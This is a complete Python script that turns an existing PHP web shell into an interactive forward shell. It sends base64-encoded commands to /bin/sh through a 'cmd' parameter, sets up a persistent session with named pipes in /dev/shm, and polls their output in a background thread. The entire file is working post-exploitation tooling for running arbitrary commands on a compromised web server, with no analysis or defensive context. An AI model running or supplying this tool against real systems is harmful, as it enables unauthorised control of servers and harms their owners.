#!/usr/bin/python3

import requests, sys, signal, time, threading
from base64 import b64encode
from random import randrange


class AllThreading(object):
    
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        readoutput = """/bin/cat %s""" % (stdout)
        clearoutput = """echo '' > %s""" % (stdout)

        while True:
            output = Cmd(readoutput)

            if output:
                Cmd(clearoutput)
                print(output)
            time.sleep(self.interval)    


def sig_handler(sig, frame):
    print("\n\n[!]Saliendo..")
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)


def Cmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')

    payload = {
        'cmd': 'echo "%s" | base64 -d | /bin/sh' % (cmd)
    }

    data = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip()
    return data

def WriteCmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')

    payload = {
        'cmd': 'echo "%s" | base64 -d > %s' % (cmd, stdin)
    }

    data = (requests.get('http://127.0.0.1/shell.php', params=payload, timeout=5).text).strip()
    return data

def ReadCmd():
    GetOutput = """/bin/cat %s""" % (stdout)
    outputs = Cmd(GetOutput)
    return outputs

def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
    
    try:
        Cmd(NamedPipes)
    except:
        None
    return None    

#Variables
global stdin, stdout
session = randrange(1000, 9999)
stdin   = "/dev/shm/input.%s" % session
stdout  = "/dev/shm/output.%s" % session

SetupShell()
ReadingAll = AllThreading()


while True:
    cmd = input("$~ ")
    WriteCmd(cmd + "\n")
    time.sleep(1.1)